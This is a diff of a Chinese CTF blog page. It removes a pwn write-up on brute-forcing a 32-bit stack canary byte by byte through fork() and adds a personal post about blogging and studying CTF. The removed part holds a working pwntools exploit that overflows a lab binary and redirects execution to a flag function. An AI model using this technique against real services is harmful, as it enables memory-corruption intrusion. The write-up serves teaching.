@@ -2,9 +2,9 @@
 <html>
 <head>
   <meta charset="utf-8">
-  <title>Bypass-Canary系列-one-by-one-爆破 | sixpar&#39;s blog</title>
-  <meta name="keywords" content=" Bypass-Canary ">
-  <meta name="description" content="Bypass-Canary系列-one-by-one-爆破 | sixpar&#39;s blog">
+  <title>生活区开篇 | sixpar&#39;s blog</title>
+  <meta name="keywords" content=" 关于我 ">
+  <meta name="description" content="生活区开篇 | sixpar&#39;s blog">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 <meta name="description" content="欢迎您的访问 想了解我？ 我只是某不知名的pwn手噢~">
 <meta property="og:type" content="website">
@@ -420,9 +420,9 @@
 </aside>
 <div id="post">
     <div class="pjax">
-        <article id="post-Bypass-Canary系列-one-by-one-爆破" class="article article-type-post" itemscope itemprop="blogPost">
+        <article id="post-生活区开篇" class="article article-type-post" itemscope itemprop="blogPost">
     
-        <h1 class="article-title">Bypass-Canary系列-one-by-one-爆破</h1>
+        <h1 class="article-title">生活区开篇</h1>
     
     <div class="article-meta">
         
@@ -432,7 +432,7 @@
             <i class="iconfont icon-category"></i>
             
             
-            <a  data-rel="系列">系列</a>
+            <a  data-rel="生活">生活</a>
             
         </span>
         
@@ -440,19 +440,19 @@
         <span class="tag">
             <i class="iconfont icon-tag"></i>
             
-            <a class="color4">Bypass-Canary</a>
+            <a class="color4">关于我</a>
             
         </span>
         
     </div>
     <div class="article-meta">
         
-            Created At : <time class="date" title='Updated At: 2020-07-05 09:26:42'>2020-07-04 23:26</time>
+            Created At : <time class="date" title='Updated At: 2020-07-05 17:27:46'>2020-07-05 16:07</time>
         
     </div>
     <div class="article-meta">
         
-        <span>Count:866</span>
+        <span>Count:1.2k</span>
         
         
         <span id="busuanzi_container_page_pv">
@@ -482,7 +482,7 @@
     
     <div class="toc-ref">
     
-        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#说明"><span class="toc-text">说明:</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#例题（-Bypass-Canary-bin1）："><span class="toc-text">*例题（&#x2F;Bypass-Canary&#x2F;bin1）：</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#exp："><span class="toc-text">exp：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#总结："><span class="toc-text">总结：</span></a></li></ol>
+        
     
 <style>
     .left-col .switch-btn,
@@ -499,67 +499,23 @@
     <div class="article-entry" itemprop="articleBody">
       
         <blockquote>
-<p>这是本系列的第三篇文章，我们根据前面学过的内容我们知道了，如果在溢出的时候算准位置将Canary的值填回去便可以绕过限制。本篇将介绍如何通过逐字节爆破得到Canary的值。</p>
+<p>还是决定开启生活区。博客嘛，可不就是随意发挥，想写啥写啥，有知识性的文章，也要有生活类小文章。</p>
 </blockquote>
-<h2 id="说明"><a href="#说明" class="headerlink" title="说明:"></a>说明:</h2><blockquote>
-<p>●本方法只适用于32位程序。为什么呢，32位程序地址是4字节，而Canary的低字节永远是”\x00”我们是知道的，所以实际只需要爆破 3 字节即可。</p>
-</blockquote>
-<p>所以现在明白为什么爆破法不能适用于64位程序了吧，8字节的地址，那得爆破到什么时候去。</p>
-<blockquote>
-<p>●本方法还有一个关键前提是程序中得有一个 fork() 函数。</p>
-</blockquote>
-<p>fork()函数是用来创建子进程的。美汁汁儿~<br>注意：父进程通过 fork 函数创建的子进程的 Canary 也是相同的，fork 函数会直接拷贝父进程的内存。</p>
-<blockquote>
-<p>●借助栈溢出漏洞，使得能覆盖到canary的地址。</p>
-</blockquote>
-<p>因此我们就可以覆盖Canary，不断试错，试对了就进入下一个字节的爆破，所以就逐个字节地将 Canary 爆破出来</p>
-<h2 id="例题（-Bypass-Canary-bin1）："><a href="#例题（-Bypass-Canary-bin1）：" class="headerlink" title="*例题（/Bypass-Canary/bin1）："></a>*例题（/Bypass-Canary/bin1）：</h2><p>file指令查看过了，是32位程序。<br>IDA分析程序，发现了main中有 fork() 函数：</p>
-<blockquote>
-<p>v3 = fork();</p>
-</blockquote>
-<p>fun函数中存在溢出漏洞。buf大小是0x70，而我们可以输入0x78。</p>
-<p>3个条件都具备了，可以利用爆破手段爆出Canary的值了。</p>
-<h3 id="exp："><a href="#exp：" class="headerlink" title="exp："></a>exp：</h3><pre><code class="python">#!/usr/bin/python3
-#coding=utf-8
-from pwn import *
-p=process(&#39;./bin1&#39;)
-context.log_level=&#39;debug&#39;
-canary_addr=&#39;\x00&#39; 
-#低字节是\x00，我们是确定的，所以接下来只需要爆破剩余的3字节即可。
-
-p.recvuntil(&#39;welcome\n&#39;)
-for i in range(3):   #3次
-    for x in range(256):
-        p.send(&#39;a&#39;*100+canary_addr+chr(x))   #不断试错
-        get=p.recvuntil(&quot;welcome\n&quot;)
-        if &#39;recv&#39; in get:
-            canary_addr+=chr(x)
-            break
-
-getflag=0x0804863B
-payload=&#39;a&#39;*(0x70-0xc)+ canary_addr +&#39;a&#39;*12+p32(getflag)  
-#0xc是存储Canary的地方，所以我们需要填充(0x70-0xc)个字节垃圾数据。
-#这里的canary的地址不用p32打包,因为爆破出来后没有作任何处理直接拿来用了，已经是小端序形式了。
-p.sendline(payload)
-p.interactive()
-</code></pre>
-<p>执行结果截图：<br><img src="https://i.loli.net/2020/07/04/N3pefMnzWljuArR.jpg" alt="本地"></p>
-<p>注意每一次运行程序的Canary值都是不一样的，这一次爆破出来的结果是 00 9f 21 af，因此canary的值为0xaf219f00</p>
-<p>可以看到图片下方出现”get flag error”字样，这个不用管，由于我们本地路径下没有这个文件，因此调用后门函数读取不到文件是很正常的事，exp没有问题，打远程的话，远程机子上一定会在指定目录下设置好flag文件的。</p>
-<h2 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h2><p>关键代码：</p>
-<pre><code class="python">for i in range(3):   
-    for x in range(256):
-        p.send(&#39;a&#39;*100+canary_addr+chr(x)) 
-        get=p.recvuntil(&quot;welcome\n&quot;)
-        if &#39;recv&#39; in get:
-            canary_addr+=chr(x)
-            break</code></pre>
-<p>由于程序有fork函数，所以我们可以不断覆盖canary进行试错，错误了就触发警报退出进程，那就再fork一个子进程继续试，试对了就进入下一个字节的爆破，然后就逐个字节地将 Canary 值爆破出来。然后老样子溢出构造payload。</p>
-<blockquote>
-<p>payload = ‘a’ * paddings + canary_addr + ‘a’ * 12 + p32(return_addr)</p>
-</blockquote>
-<p>注意canary之后要填充12字节的垃圾数据才到返回地址。</p>
-<p>芜湖，终于写完了。<br>–2020.7.5 0:09  &emsp;晚安</p>
+<p>最近花大精力，日以继夜地更新博客，就是想多写一点文章充实一下博客。用Markdown写文章也不方便，图片还要上传到图床保存，每一次改动后还要通过git bash上传到仓库里。虽然没有继续做新题，但是我发现我在整理搬运笔记的过程中再次巩固回味了一遍知识，也算是有所收获。以前看不懂的题目和知识，现在都能理解和掌握了。</p>
+<p>话说我现在写文章更新博客，算是圆了我初中时候想当一位网络写手的梦想hhh，当时差点签约，被我爸阻止。虽然没多少人看（看到这句话的人说明都是真爱！），但是还是满满的成就感。</p>
+<p>说到成就感，有积极的反馈才有成就感，当然才会激发更多的动力去做好这件事。</p>
+<p>就拿编程开发来说吧，本学期由于疫情影响在家里上网课，疫情对我们计算机专业的学生影响不太大。JSP和数据库安全课程都有布置大作业。自大作业下发下来，我就开始设计编程，我记得JSP的作业我是肝到了凌晨1点多才迫不得已去睡觉（健康最重要[滑稽]），第二天一起床就继续写（电脑桌在床边）。数据库系统我是肝了两天才完工。当看到自己开发的项目正常运行的时候，我开心疯了，一首dj舞曲单曲循环了2小时（没错，我当时激动坏了）。我想这就是当程序员的快乐吧！这就是满满的成就感。</p>
+<p>但是自我学习CTF以来（2019年5月开始的吧），获得的成就感很少。由于当时遇到的接二连三的打击，我几度自闭(当时出现轻生念头)。说来皆是遗憾。自那时候开始我的积极性出了问题，什么比赛也不再参加，我对人生的态度也出了问题。时间会抚平内心的伤。<br>虽然有成就感，学习上会更加积极，但是没有成就感就应该消极对待吗？我重新审视自己一遍，决定重新振作。以前的我什么都学一点，但以后我只选择pwn作为我的方向。为爱发电，即使是在他人眼里枯燥的二进制，我也依然会找到乐趣。</p>
+<p>记得大一下的时候，沈学长开设CTF学分制班，我第一次了解CTF，学会了使用杂项和web的一些工具。 现在回味起来，沈学长在pwnable.kr上解题，当打开终端输指令的时候，我心想 好吉尔炫酷。当时学会了第一个指令叫做 ls。<br>学分制班很快就结束了，接下来在大一的暑假里我开始自学CTF，在各平台上刷题。记得当时是在实验吧起步，然后做到bugku。虽然什么都不懂，但是就是依然在刷题，通过刷题去学习知识。学习二进制，然后就在网上找学习方案，花了一点时间看完王爽的汇编，做pwn题的时候也是自己慢慢积累，不懂的问度娘。两个月的时间过得很快。也才算刚入门状态吧。</p>
+<p>2019年9月-11月这段时期，我选择遗忘。</p>
+<p>我不会玩王者，也不沉迷任何游戏，只会偶尔刷最右，当一名快乐的沙雕，调节心情。然后剩余的时间我都用于学习上，包括大学课程和CTF学习。</p>
+<p>今天下午看到许多师傅转发花花师傅的说说，我毫不犹豫付费加入了一个知识星球，球主是Sakura师傅，里面分享有关于二进制pwn的知识，希望能从师傅那里学到知识，规划好学习方向。我知道我现在还处在一个很底层的阶段，堆栈只是基础的知识。pwn也是分为很多阶段的，正所谓入门难，进阶难，精通难。</p>
+<p>我相信一万小时定律。</p>
+<p>对于未来，我要考研。高考完后我才明白了许多道理 … （省略1千字）</p>
+<hr>
+<p>以上全是想到啥就写啥，个人情感成分较多，也难怪归于生活区。这只是个开篇文章。</p>
+<p>写到这里就先告一段落吧。</p>
+<p>想找个(女)同伴一起学习真的太难了。[坏笑]</p>
 
       
        <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎指出任何有错误或不够清晰的表达。可以在下面评论区评论嗷。 </span>
